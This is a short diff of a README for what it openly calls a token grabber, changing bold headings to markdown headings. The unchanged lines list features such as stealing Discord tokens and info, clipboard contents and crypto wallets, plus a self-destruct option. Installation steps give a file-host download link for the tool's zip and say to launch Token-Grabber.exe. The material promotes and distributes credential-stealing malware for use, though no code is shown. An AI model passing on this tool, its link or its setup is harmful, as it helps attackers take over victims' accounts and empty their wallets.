@@ -1,4 +1,4 @@
-**Features**
+# Features
 Discord Info
 
 Token
@@ -53,7 +53,7 @@ Self Destruct
 Clipboard
 Crypto Wallets
 
-**Installation**
+# Installation
 1. First download token grabber from here https://dosya.co/6gss1wzkpszw/Token-Grabber-Main.zip.html
 2. Download any python version
 3.Launch Token-Grabber.exe and select the python version and wait
